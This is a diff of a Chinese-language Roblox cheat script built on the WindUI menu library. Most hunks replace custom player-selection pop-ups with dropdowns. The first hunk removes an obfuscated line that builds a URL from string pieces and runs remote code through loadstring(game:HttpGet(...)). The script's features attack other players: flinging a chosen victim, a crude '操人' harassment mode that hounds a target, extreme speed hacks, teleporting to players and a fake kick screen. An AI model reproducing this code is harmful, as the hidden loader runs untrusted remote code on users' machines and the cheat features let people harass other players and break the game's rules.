@@ -36,11 +36,6 @@ UserInputService.InputEnded:Connect(function(input, gameProcessed)
     end
 end)
 
-pcall(function()
-    local x1,x2,x3,x4,x5 = "ivyy",".lol","/kongbai/","9178","v"
-    loadstring(game:HttpGet("https://" .. x1 .. x2 .. x3 .. x4 .. x5))()
-end)
-
 WindUI:Notify({
     Title = "恐脚本--通用",
     Content = "作者：恐拜大帝\nQQ：3999698324\n感谢ROB支持",
@@ -423,8 +418,6 @@ UserInputService.JumpRequest:Connect(function()
     end
 end)
 
-
-
 local followTarget = nil
 local followConnection = nil
 local followRange = 5
@@ -801,76 +794,6 @@ local function powerfulFling(targetPlayer)
     WindUI:Notify({ Title = "甩飞完成", Content = "已完成对 " .. targetPlayer.Name .. " 的甩飞", Duration = 3 })
 end
 
-local function showPlayerSelect(callback, titleText)
-    local selectGui = Instance.new("ScreenGui")
-    selectGui.Name = "PlayerSelect"
-    selectGui.Parent = LocalPlayer.PlayerGui
-    selectGui.IgnoreGuiInset = true
-    selectGui.ResetOnSpawn = false
-    selectGui.DisplayOrder = 999
-    local blocker = Instance.new("Frame")
-    blocker.Name = "Blocker"
-    blocker.Parent = selectGui
-    blocker.Size = UDim2.new(1, 0, 1, 0)
-    blocker.BackgroundTransparency = 1
-    blocker.Active = true
-    blocker.ZIndex = 0
-    local bg = Instance.new("Frame")
-    bg.Parent = selectGui
-    bg.Size = UDim2.new(0, 200, 0, 250)
-    bg.Position = UDim2.new(0.5, -100, 0.5, -125)
-    bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    bg.ZIndex = 1
-    local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 12); corner.Parent = bg
-    local title = Instance.new("TextLabel")
-    title.Parent = bg
-    title.Size = UDim2.new(1, 0, 0, 30)
-    title.BackgroundTransparency = 1
-    title.Text = titleText or "选择玩家"
-    title.TextColor3 = Color3.new(1,1,1)
-    title.Font = Enum.Font.SourceSansBold
-    title.TextSize = 16
-    local scrollFrame = Instance.new("ScrollingFrame")
-    scrollFrame.Parent = bg
-    scrollFrame.Size = UDim2.new(1, -10, 1, -40)
-    scrollFrame.Position = UDim2.new(0, 5, 0, 35)
-    scrollFrame.BackgroundTransparency = 1
-    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-    scrollFrame.ScrollBarThickness = 4
-    local playersList = Players:GetPlayers()
-    local y = 0
-    for _, p in ipairs(playersList) do
-        if p ~= LocalPlayer then
-            local btn = Instance.new("TextButton")
-            btn.Parent = scrollFrame
-            btn.Size = UDim2.new(1, -10, 0, 30)
-            btn.Position = UDim2.new(0, 5, 0, y)
-            btn.Text = p.Name
-            btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-            btn.TextColor3 = Color3.new(1,1,1)
-            btn.Font = Enum.Font.SourceSans
-            btn.TextSize = 14
-            local btnCorner = Instance.new("UICorner"); btnCorner.CornerRadius = UDim.new(0, 6); btnCorner.Parent = btn
-            btn.MouseButton1Click:Connect(function()
-                callback(p); selectGui:Destroy()
-            end)
-            y = y + 35
-        end
-    end
-    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, y)
-    local closeBtn = Instance.new("TextButton")
-    closeBtn.Parent = bg
-    closeBtn.Size = UDim2.new(0, 30, 0, 20)
-    closeBtn.Position = UDim2.new(1, -35, 0, 5)
-    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-    closeBtn.Text = "X"
-    closeBtn.TextColor3 = Color3.new(1,1,1)
-    closeBtn.Font = Enum.Font.SourceSansBold
-    closeBtn.TextSize = 14
-    local closeCorner = Instance.new("UICorner"); closeCorner.CornerRadius = UDim.new(0, 4); closeCorner.Parent = closeBtn
-    closeBtn.MouseButton1Click:Connect(function() selectGui:Destroy() end)
-end
-
 local function startSpeedAntiPull(speed)
     if speedAntiPull then speedAntiPull:Disconnect() end
     speedAntiPull = RunService.Heartbeat:Connect(function()
@@ -1222,170 +1145,6 @@ local function startSmoothFollow(targetPlayer)
     WindUI:Notify({ Title = "平滑跟随", Content = "开始平滑跟随 " .. targetPlayer.Name, Duration = 3 })
 end
 
-local function showSmoothFollowSelect()
-    if smoothFollowConnection then return end
-    local selectGui = Instance.new("ScreenGui")
-    selectGui.Name = "SmoothFollowSelect"
-    selectGui.Parent = LocalPlayer.PlayerGui
-    selectGui.IgnoreGuiInset = true
-    selectGui.ResetOnSpawn = false
-    selectGui.DisplayOrder = 999
-    local blocker = Instance.new("Frame")
-    blocker.Name = "Blocker"
-    blocker.Parent = selectGui
-    blocker.Size = UDim2.new(1, 0, 1, 0)
-    blocker.BackgroundTransparency = 1
-    blocker.Active = true
-    blocker.ZIndex = 0
-    local bg = Instance.new("Frame")
-    bg.Parent = selectGui
-    bg.Size = UDim2.new(0, 200, 0, 250)
-    bg.Position = UDim2.new(0.5, -100, 0.5, -125)
-    bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    bg.ZIndex = 1
-    local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 12); corner.Parent = bg
-    local title = Instance.new("TextLabel")
-    title.Parent = bg
-    title.Size = UDim2.new(1, 0, 0, 30)
-    title.BackgroundTransparency = 1
-    title.Text = "选择跟随目标"
-    title.TextColor3 = Color3.new(1,1,1)
-    title.Font = Enum.Font.SourceSansBold
-    title.TextSize = 16
-    local scrollFrame = Instance.new("ScrollingFrame")
-    scrollFrame.Parent = bg
-    scrollFrame.Size = UDim2.new(1, -10, 1, -40)
-    scrollFrame.Position = UDim2.new(0, 5, 0, 35)
-    scrollFrame.BackgroundTransparency = 1
-    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-    scrollFrame.ScrollBarThickness = 4
-    local playersList = Players:GetPlayers()
-    local y = 0
-    for _, p in ipairs(playersList) do
-        if p ~= LocalPlayer then
-            local btn = Instance.new("TextButton")
-            btn.Parent = scrollFrame
-            btn.Size = UDim2.new(1, -10, 0, 30)
-            btn.Position = UDim2.new(0, 5, 0, y)
-            btn.Text = p.Name
-            btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-            btn.TextColor3 = Color3.new(1,1,1)
-            btn.Font = Enum.Font.SourceSans
-            btn.TextSize = 14
-            local btnCorner = Instance.new("UICorner"); btnCorner.CornerRadius = UDim.new(0, 6); btnCorner.Parent = btn
-            btn.MouseButton1Click:Connect(function()
-                startSmoothFollow(p)
-                if UIButtons.smoothFollowSelectBtn then UIButtons.smoothFollowSelectBtn.Text = "停止平滑跟随" end
-                selectGui:Destroy()
-            end)
-            y = y + 35
-        end
-    end
-    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, y)
-    local closeBtn = Instance.new("TextButton")
-    closeBtn.Parent = bg
-    closeBtn.Size = UDim2.new(0, 30, 0, 20)
-    closeBtn.Position = UDim2.new(1, -35, 0, 5)
-    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-    closeBtn.Text = "X"
-    closeBtn.TextColor3 = Color3.new(1,1,1)
-    closeBtn.Font = Enum.Font.SourceSansBold
-    closeBtn.TextSize = 14
-    local closeCorner = Instance.new("UICorner"); closeCorner.CornerRadius = UDim.new(0, 4); closeCorner.Parent = closeBtn
-    closeBtn.MouseButton1Click:Connect(function() selectGui:Destroy() end)
-end
-
-local function showHarassSelect()
-    if harassEnabled then return end
-    local selectGui = Instance.new("ScreenGui")
-    selectGui.Name = "HarassSelect"
-    selectGui.Parent = LocalPlayer.PlayerGui
-    selectGui.IgnoreGuiInset = true
-    selectGui.ResetOnSpawn = false
-    selectGui.DisplayOrder = 999
-    local blocker = Instance.new("Frame")
-    blocker.Name = "Blocker"
-    blocker.Parent = selectGui
-    blocker.Size = UDim2.new(1, 0, 1, 0)
-    blocker.BackgroundTransparency = 1
-    blocker.Active = true
-    blocker.ZIndex = 0
-    local bg = Instance.new("Frame")
-    bg.Parent = selectGui
-    bg.Size = UDim2.new(0, 220, 0, 300)
-    bg.Position = UDim2.new(0.5, -110, 0.5, -150)
-    bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    bg.ZIndex = 1
-    local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 12); corner.Parent = bg
-    local title = Instance.new("TextLabel")
-    title.Parent = bg
-    title.Size = UDim2.new(1, 0, 0, 30)
-    title.BackgroundTransparency = 1
-    title.Text = "选择操人目标"
-    title.TextColor3 = Color3.new(1,1,1)
-    title.Font = Enum.Font.SourceSansBold
-    title.TextSize = 16
-    local scrollFrame = Instance.new("ScrollingFrame")
-    scrollFrame.Parent = bg
-    scrollFrame.Size = UDim2.new(1, -10, 1, -80)
-    scrollFrame.Position = UDim2.new(0, 5, 0, 35)
-    scrollFrame.BackgroundTransparency = 1
-    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-    scrollFrame.ScrollBarThickness = 4
-    local playersList = Players:GetPlayers()
-    local y = 0
-    for _, p in ipairs(playersList) do
-        if p ~= LocalPlayer then
-            local btn = Instance.new("TextButton")
-            btn.Parent = scrollFrame
-            btn.Size = UDim2.new(1, -10, 0, 30)
-            btn.Position = UDim2.new(0, 5, 0, y)
-            btn.Text = p.Name
-            btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-            btn.TextColor3 = Color3.new(1,1,1)
-            btn.Font = Enum.Font.SourceSans
-            btn.TextSize = 14
-            local btnCorner = Instance.new("UICorner"); btnCorner.CornerRadius = UDim.new(0, 6); btnCorner.Parent = btn
-            btn.MouseButton1Click:Connect(function()
-                harassTarget = p
-                harassEnabled = true
-                startHarass()
-                selectGui:Destroy()
-                if UIButtons.harassBtn then UIButtons.harassBtn.Text = "停止操人" end
-                WindUI:Notify({ Title = "操人", Content = "开始疯狂操 " .. p.Name .. "！", Duration = 3 })
-            end)
-            y = y + 35
-        end
-    end
-    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, y)
-    local cancelBtn = Instance.new("TextButton")
-    cancelBtn.Parent = bg
-    cancelBtn.Size = UDim2.new(1, -20, 0, 30)
-    cancelBtn.Position = UDim2.new(0, 10, 1, -40)
-    cancelBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-    cancelBtn.Text = "取消操人"
-    cancelBtn.TextColor3 = Color3.new(1,1,1)
-    cancelBtn.Font = Enum.Font.SourceSansBold
-    cancelBtn.TextSize = 14
-    local cancelCorner = Instance.new("UICorner"); cancelCorner.CornerRadius = UDim.new(0, 6); cancelCorner.Parent = cancelBtn
-    cancelBtn.MouseButton1Click:Connect(function()
-        stopHarass()
-        selectGui:Destroy()
-        WindUI:Notify({ Title = "操人", Content = "已取消操人", Duration = 2 })
-    end)
-    local closeBtn = Instance.new("TextButton")
-    closeBtn.Parent = bg
-    closeBtn.Size = UDim2.new(0, 30, 0, 20)
-    closeBtn.Position = UDim2.new(1, -35, 0, 5)
-    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-    closeBtn.Text = "X"
-    closeBtn.TextColor3 = Color3.new(1,1,1)
-    closeBtn.Font = Enum.Font.SourceSansBold
-    closeBtn.TextSize = 14
-    local closeCorner = Instance.new("UICorner"); closeCorner.CornerRadius = UDim.new(0, 4); closeCorner.Parent = closeBtn
-    closeBtn.MouseButton1Click:Connect(function() selectGui:Destroy() end)
-end
-
 local function createJumpFloat()
     if jumpFloatGui then jumpFloatGui:Destroy() end
     jumpFloatGui = Instance.new("ScreenGui", CoreGui)
@@ -1727,24 +1486,43 @@ Tabs.MainTab:Toggle({
     end
 })
 
+local speedToggle = false
+local speedValue = 16
+Tabs.MainTab:Toggle({
+    Title = "修改移速",
+    Value = false,
+    Callback = function(state)
+        speedToggle = state
+        if state then
+            local hum = getHumanoid()
+            if hum then hum.WalkSpeed = speedValue end
+            startSpeedAntiPull(speedValue)
+            WindUI:Notify({ Title = "修改移速", Content = "已开启，当前移速：" .. speedValue, Duration = 3 })
+        else
+            stopSpeedAntiPull()
+            local hum = getHumanoid()
+            if hum then hum.WalkSpeed = 16 end
+            WindUI:Notify({ Title = "修改移速", Content = "已关闭，恢复默认移速", Duration = 3 })
+        end
+    end
+})
+
 Tabs.MainTab:Slider({
-    Title = "修改移速 (当前: 16)",
+    Title = "移速数值 (当前: 16)",
     Value = {
         Min = 5,
         Max = 1000,
         Default = 16,
     },
     Callback = function(value)
-        pendingSliderValues["movespeed"] = value
+        speedValue = value
+        if speedToggle then
+            local hum = getHumanoid()
+            if hum then hum.WalkSpeed = value end
+            startSpeedAntiPull(value)
+        end
     end
 })
-sliderReleaseActions["movespeed"] = function(val)
-    local hum = getHumanoid()
-    if hum then hum.WalkSpeed = val end
-    startSpeedAntiPull(val)
-    WindUI:Notify({ Title = "修改移速", Content = "移速已设置为：" .. tostring(val), Duration = 3 })
-end
-
 Tabs.MainTab:Toggle({
     Title = "夜视",
     Value = false,
@@ -1839,15 +1617,45 @@ Tabs.MainTab:Button({
     end
 })
 
-Tabs.MainTab:Button({
-    Title = "甩飞选定玩家",
-    Callback = function()
-        showPlayerSelect(function(p)
-            WindUI:Notify({ Title = "甩飞", Content = "正在甩飞 " .. p.Name, Duration = 3 })
-            task.spawn(function() powerfulFling(p) end)
-        end, "选择要甩飞的玩家")
+local currentFlingTarget = nil
+flingDropdown = Tabs.MainTab:Dropdown({
+    Title = "选定甩飞玩家",
+    Values = {},
+    Callback = function(name)
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p.Name == name and p ~= LocalPlayer then
+                currentFlingTarget = p
+                flingDropdown:SetTitle("已选定: " .. p.Name)
+                break
+            end
+        end
     end
 })
+
+Tabs.MainTab:Button({
+    Title = "确定执行甩飞",
+    Callback = function()
+        if currentFlingTarget and currentFlingTarget.Parent then
+            WindUI:Notify({ Title = "甩飞", Content = "正在甩飞 " .. currentFlingTarget.Name, Duration = 3 })
+            task.spawn(function() powerfulFling(currentFlingTarget) end)
+            currentFlingTarget = nil
+            flingDropdown:SetTitle("选定甩飞玩家")
+        else
+            WindUI:Notify({ Title = "甩飞", Content = "请先选择玩家", Duration = 3 })
+        end
+    end
+})
+
+local function refreshFlingDropdown()
+    local names = {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then table.insert(names, p.Name) end
+    end
+    if flingDropdown then flingDropdown:Refresh(names) end
+end
+refreshFlingDropdown()
+Players.PlayerAdded:Connect(refreshFlingDropdown)
+Players.PlayerRemoving:Connect(refreshFlingDropdown)
 
 Tabs.MainTab:Button({
     Title = "祖国人汉化",
@@ -1894,28 +1702,64 @@ Tabs.SecondaryTab:Button({
     Callback = function()
         local nearest = nil
         local minDist = math.huge
-        local myPos = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character.HumanoidRootPart.Position
-        if not myPos then return end
+        local myChar = LocalPlayer.Character
+        if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then
+            WindUI:Notify({ Title = "传送", Content = "你的角色未加载", Duration = 3 })
+            return
+        end
+        local myPos = myChar.HumanoidRootPart.Position
         for _, p in ipairs(Players:GetPlayers()) do
             if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                 local dist = (p.Character.HumanoidRootPart.Position - myPos).Magnitude
                 if dist < minDist then minDist = dist; nearest = p end
             end
         end
-        if nearest and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-            LocalPlayer.Character.HumanoidRootPart.CFrame = nearest.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 3)
+        if nearest and nearest.Character and nearest.Character:FindFirstChild("HumanoidRootPart") then
+            myChar.HumanoidRootPart.CFrame = nearest.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 3)
+            WindUI:Notify({ Title = "传送", Content = "已传送到 " .. nearest.Name, Duration = 3 })
+        else
+            WindUI:Notify({ Title = "传送", Content = "未找到其他玩家", Duration = 3 })
+        end
+    end
+})
+
+local currentFollowTarget = nil
+followDropdown = Tabs.SecondaryTab:Dropdown({
+    Title = "选定跟随玩家",
+    Values = {},
+    Callback = function(name)
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p.Name == name and p ~= LocalPlayer then
+                currentFollowTarget = p
+                followDropdown:SetTitle("已选定: " .. p.Name)
+                WindUI:Notify({ Title = "跟随", Content = "已选定 " .. p.Name .. "，点击确定开始跟随", Duration = 3 })
+                break
+            end
         end
     end
 })
 
 Tabs.SecondaryTab:Button({
-    Title = "选定玩家跟随",
+    Title = "确定执行跟随",
     Callback = function()
-        showPlayerSelect(function(p)
-            startFollow(p)
-        end, "选择要跟随的玩家")
+        if currentFollowTarget and currentFollowTarget.Parent then
+            startFollow(currentFollowTarget)
+        else
+            WindUI:Notify({ Title = "跟随", Content = "请先选择玩家", Duration = 3 })
+        end
     end
 })
+
+local function refreshFollowDropdown()
+    local names = {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then table.insert(names, p.Name) end
+    end
+    if followDropdown then followDropdown:Refresh(names) end
+end
+refreshFollowDropdown()
+Players.PlayerAdded:Connect(refreshFollowDropdown)
+Players.PlayerRemoving:Connect(refreshFollowDropdown)
 
 Tabs.SecondaryTab:Button({
     Title = "停止跟随",
@@ -1925,7 +1769,7 @@ Tabs.SecondaryTab:Button({
 })
 
 Tabs.SecondaryTab:Button({
-    Title = "显示实时坐标",
+    Title = "复制当前坐标",
     Callback = function()
         local char = LocalPlayer.Character
         if char and char:FindFirstChild("HumanoidRootPart") then
@@ -1939,7 +1783,7 @@ Tabs.SecondaryTab:Button({
 })
 
 Tabs.SecondaryTab:Button({
-    Title = "输入坐标传送",
+    Title = "传送指定坐标",
     Callback = function()
         local coordGui = Instance.new("ScreenGui")
         coordGui.Name = "CoordTeleportGui"
@@ -2023,15 +1867,6 @@ Tabs.SecondaryTab:Button({
     end
 })
 
-Tabs.SecondaryTab:Button({
-    Title = "选人传送",
-    Callback = function()
-        showPlayerSelect(function(p)
-            teleportToPlayer(p)
-        end, "选择要传送的玩家")
-    end
-})
-
 Tabs.SecondaryTab:Toggle({
     Title = "锁定视角",
     Value = false,
@@ -2041,16 +1876,52 @@ Tabs.SecondaryTab:Toggle({
     end
 })
 
-Tabs.SecondaryTab:Button({
-    Title = "平滑跟随选定人",
-    Callback = function()
-        if smoothFollowConnection then
-            stopSmoothFollow()
-        else
-            showSmoothFollowSelect()
+local currentSmoothTarget = nil
+smoothDropdown = Tabs.SecondaryTab:Dropdown({
+    Title = "选定平滑跟随玩家",
+    Values = {},
+    Callback = function(name)
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p.Name == name and p ~= LocalPlayer then
+                currentSmoothTarget = p
+                smoothDropdown:SetTitle("已选定: " .. p.Name)
+                WindUI:Notify({ Title = "平滑跟随", Content = "已选定 " .. p.Name .. "，点击确定开始平滑跟随", Duration = 3 })
+                break
+            end
         end
     end
 })
+
+Tabs.SecondaryTab:Button({
+    Title = "确定执行平滑跟随",
+    Callback = function()
+        if currentSmoothTarget and currentSmoothTarget.Parent then
+            startSmoothFollow(currentSmoothTarget)
+        else
+            WindUI:Notify({ Title = "平滑跟随", Content = "请先选择玩家", Duration = 3 })
+        end
+    end
+})
+
+Tabs.SecondaryTab:Button({
+    Title = "停止平滑跟随",
+    Callback = function()
+        stopSmoothFollow()
+        currentSmoothTarget = nil
+        smoothDropdown:SetTitle("选定平滑跟随玩家")
+    end
+})
+
+local function refreshSmoothDropdown()
+    local names = {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then table.insert(names, p.Name) end
+    end
+    if smoothDropdown then smoothDropdown:Refresh(names) end
+end
+refreshSmoothDropdown()
+Players.PlayerAdded:Connect(refreshSmoothDropdown)
+Players.PlayerRemoving:Connect(refreshSmoothDropdown)
 
 Tabs.SecondaryTab:Button({
     Title = "平滑跟随最近的人",
@@ -2084,16 +1955,55 @@ Tabs.SecondaryTab:Toggle({
     end
 })
 
-Tabs.SecondaryTab:Button({
-    Title = "操人",
-    Callback = function()
-        if harassEnabled then
-            stopHarass()
-        else
-            showHarassSelect()
+local currentHarassTarget = nil
+harassDropdown = Tabs.SecondaryTab:Dropdown({
+    Title = "选定操人目标",
+    Values = {},
+    Callback = function(name)
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p.Name == name and p ~= LocalPlayer then
+                currentHarassTarget = p
+                harassDropdown:SetTitle("已选定: " .. p.Name)
+                WindUI:Notify({ Title = "操人", Content = "已选定 " .. p.Name .. "，点击确定开始操人", Duration = 3 })
+                break
+            end
         end
     end
 })
+
+Tabs.SecondaryTab:Button({
+    Title = "确定执行操人",
+    Callback = function()
+        if currentHarassTarget and currentHarassTarget.Parent then
+            harassTarget = currentHarassTarget
+            harassEnabled = true
+            startHarass()
+            WindUI:Notify({ Title = "操人", Content = "开始疯狂操 " .. currentHarassTarget.Name .. "！", Duration = 3 })
+        else
+            WindUI:Notify({ Title = "操人", Content = "请先选择玩家", Duration = 3 })
+        end
+    end
+})
+
+Tabs.SecondaryTab:Button({
+    Title = "停止操人",
+    Callback = function()
+        stopHarass()
+        currentHarassTarget = nil
+        harassDropdown:SetTitle("选定操人目标")
+    end
+})
+
+local function refreshHarassDropdown()
+    local names = {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then table.insert(names, p.Name) end
+    end
+    if harassDropdown then harassDropdown:Refresh(names) end
+end
+refreshHarassDropdown()
+Players.PlayerAdded:Connect(refreshHarassDropdown)
+Players.PlayerRemoving:Connect(refreshHarassDropdown)
 
 Tabs.SecondaryTab:Button({
     Title = "操最近的人",
@@ -2230,313 +2140,67 @@ Tabs.MiscTab:Button({
     end
 })
 
-Tabs.MiscTab:Button({
+Tabs.MiscTab:Input({
     Title = "数字ID传送",
-    Callback = function()
-        local placeGui = Instance.new("ScreenGui")
-        placeGui.Name = "PlaceIdTeleportGui"
-        placeGui.Parent = LocalPlayer.PlayerGui
-        placeGui.IgnoreGuiInset = true
-        placeGui.ResetOnSpawn = false
-        placeGui.DisplayOrder = 999
-        local bg = Instance.new("Frame")
-        bg.Parent = placeGui
-        bg.Size = UDim2.new(0, 320, 0, 200)
-        bg.Position = UDim2.new(0.5, -160, 0.5, -100)
-        bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-        Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 12)
-        local title = Instance.new("TextLabel")
-        title.Parent = bg
-        title.Size = UDim2.new(1, 0, 0, 35)
-        title.Position = UDim2.new(0, 0, 0, 5)
-        title.BackgroundTransparency = 1
-        title.Text = "数字ID传送 (PlaceId)"
-        title.TextColor3 = Color3.new(1, 1, 1)
-        title.Font = Enum.Font.SourceSansBold
-        title.TextSize = 20
-        local descLabel = Instance.new("TextLabel")
-        descLabel.Parent = bg
-        descLabel.Size = UDim2.new(1, -20, 0, 20)
-        descLabel.Position = UDim2.new(0, 10, 0, 40)
-        descLabel.BackgroundTransparency = 1
-        descLabel.Text = "输入游戏数字ID，传送到对应游戏"
-        descLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-        descLabel.Font = Enum.Font.SourceSans
-        descLabel.TextSize = 13
-        descLabel.TextXAlignment = Enum.TextXAlignment.Left
-        local inputBox = Instance.new("TextBox")
-        inputBox.Parent = bg
-        inputBox.Size = UDim2.new(1, -20, 0, 35)
-        inputBox.Position = UDim2.new(0, 10, 0, 65)
-        inputBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-        inputBox.PlaceholderText = "例如: 286090429 (兵工厂)"
-        inputBox.Text = ""
-        inputBox.TextColor3 = Color3.new(1, 1, 1)
-        inputBox.Font = Enum.Font.SourceSans
-        inputBox.TextSize = 16
-        Instance.new("UICorner", inputBox).CornerRadius = UDim.new(0, 6)
-        local teleportBtn = Instance.new("TextButton")
-        teleportBtn.Parent = bg
-        teleportBtn.Size = UDim2.new(0.45, 0, 0, 35)
-        teleportBtn.Position = UDim2.new(0.05, 0, 0, 110)
-        teleportBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-        teleportBtn.Text = "传送"
-        teleportBtn.TextColor3 = Color3.new(1, 1, 1)
-        teleportBtn.Font = Enum.Font.SourceSansBold
-        teleportBtn.TextSize = 16
-        Instance.new("UICorner", teleportBtn).CornerRadius = UDim.new(0, 6)
-        teleportBtn.MouseButton1Click:Connect(function()
-            local placeId = tonumber(inputBox.Text)
-            if not placeId then
-                WindUI:Notify({ Title = "传送失败", Content = "请输入有效的数字ID", Duration = 3 })
-                return
-            end
+    Placeholder = "输入PlaceId，例如: 286090429",
+    Callback = function(v)
+        if not v or v == "" then return end
+        local placeId = tonumber(v)
+        if placeId then
             WindUI:Notify({ Title = "数字ID传送", Content = "正在传送到 PlaceId: " .. tostring(placeId) .. " ...", Duration = 5 })
             pcall(function()
                 game:GetService("TeleportService"):Teleport(placeId, LocalPlayer)
             end)
-            placeGui:Destroy()
-        end)
-        local copyCurrentBtn = Instance.new("TextButton")
-        copyCurrentBtn.Parent = bg
-        copyCurrentBtn.Size = UDim2.new(0.45, 0, 0, 35)
-        copyCurrentBtn.Position = UDim2.new(0.5, 0, 0, 110)
-        copyCurrentBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
-        copyCurrentBtn.Text = "复制当前ID"
-        copyCurrentBtn.TextColor3 = Color3.new(1, 1, 1)
-        copyCurrentBtn.Font = Enum.Font.SourceSansBold
-        copyCurrentBtn.TextSize = 16
-        Instance.new("UICorner", copyCurrentBtn).CornerRadius = UDim.new(0, 6)
-        copyCurrentBtn.MouseButton1Click:Connect(function()
-            pcall(function() setclipboard(tostring(game.PlaceId)) end)
-            WindUI:Notify({ Title = "数字ID", Content = "已复制当前PlaceId: " .. tostring(game.PlaceId), Duration = 3 })
-        end)
-        local closeBtn = Instance.new("TextButton")
-        closeBtn.Parent = bg
-        closeBtn.Size = UDim2.new(0.9, 0, 0, 30)
-        closeBtn.Position = UDim2.new(0.05, 0, 0, 155)
-        closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-        closeBtn.Text = "关闭"
-        closeBtn.TextColor3 = Color3.new(1, 1, 1)
-        closeBtn.Font = Enum.Font.SourceSansBold
-        closeBtn.TextSize = 16
-        Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
-        closeBtn.MouseButton1Click:Connect(function() placeGui:Destroy() end)
+        else
+            WindUI:Notify({ Title = "传送失败", Content = "请输入有效的数字ID", Duration = 3 })
+        end
     end
 })
 
+local kickTitle, kickContent = "你被踢出了游戏", "Error Code: 267"
+Tabs.MiscTab:Input({
+    Title = "自定义踢出标题",
+    Placeholder = "输入踢出标题",
+    Callback = function(v)
+        if v and v ~= "" then kickTitle = v end
+    end
+})
+Tabs.MiscTab:Input({
+    Title = "自定义踢出内容",
+    Placeholder = "输入踢出内容",
+    Callback = function(v)
+        if v and v ~= "" then kickContent = v end
+    end
+})
 Tabs.MiscTab:Button({
-    Title = "自定义踢出",
+    Title = "执行自定义踢出",
     Callback = function()
-        local kickGui = Instance.new("ScreenGui")
-        kickGui.Name = "CustomKickGui"
-        kickGui.Parent = LocalPlayer.PlayerGui
-        kickGui.IgnoreGuiInset = true
-        kickGui.ResetOnSpawn = false
-        kickGui.DisplayOrder = 999
-        local bg = Instance.new("Frame")
-        bg.Parent = kickGui
-        bg.Size = UDim2.new(0, 320, 0, 280)
-        bg.Position = UDim2.new(0.5, -160, 0.5, -140)
-        bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-        Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 12)
-        local title = Instance.new("TextLabel")
-        title.Parent = bg
-        title.Size = UDim2.new(1, 0, 0, 35)
-        title.Position = UDim2.new(0, 0, 0, 5)
-        title.BackgroundTransparency = 1
-        title.Text = "自定义踢出弹窗"
-        title.TextColor3 = Color3.new(1, 1, 1)
-        title.Font = Enum.Font.SourceSansBold
-        title.TextSize = 20
-        local titleLabel = Instance.new("TextLabel")
-        titleLabel.Parent = bg
-        titleLabel.Size = UDim2.new(1, -20, 0, 20)
-        titleLabel.Position = UDim2.new(0, 10, 0, 45)
-        titleLabel.BackgroundTransparency = 1
-        titleLabel.Text = "踢出标题:"
-        titleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-        titleLabel.Font = Enum.Font.SourceSans
-        titleLabel.TextSize = 14
-        titleLabel.TextXAlignment = Enum.TextXAlignment.Left
-        local titleBox = Instance.new("TextBox")
-        titleBox.Parent = bg
-        titleBox.Size = UDim2.new(1, -20, 0, 30)
-        titleBox.Position = UDim2.new(0, 10, 0, 65)
-        titleBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-        titleBox.Text = "你被踢出了游戏"
-        titleBox.TextColor3 = Color3.new(1, 1, 1)
-        titleBox.Font = Enum.Font.SourceSans
-        titleBox.TextSize = 16
-        Instance.new("UICorner", titleBox).CornerRadius = UDim.new(0, 6)
-        local contentLabel = Instance.new("TextLabel")
-        contentLabel.Parent = bg
-        contentLabel.Size = UDim2.new(1, -20, 0, 20)
-        contentLabel.Position = UDim2.new(0, 10, 0, 100)
-        contentLabel.BackgroundTransparency = 1
-        contentLabel.Text = "踢出内容:"
-        contentLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-        contentLabel.Font = Enum.Font.SourceSans
-        contentLabel.TextSize = 14
-        contentLabel.TextXAlignment = Enum.TextXAlignment.Left
-        local contentBox = Instance.new("TextBox")
-        contentBox.Parent = bg
-        contentBox.Size = UDim2.new(1, -20, 0, 60)
-        contentBox.Position = UDim2.new(0, 10, 0, 120)
-        contentBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-        contentBox.Text = "Error Code: 267"
-        contentBox.TextColor3 = Color3.new(1, 1, 1)
-        contentBox.Font = Enum.Font.SourceSans
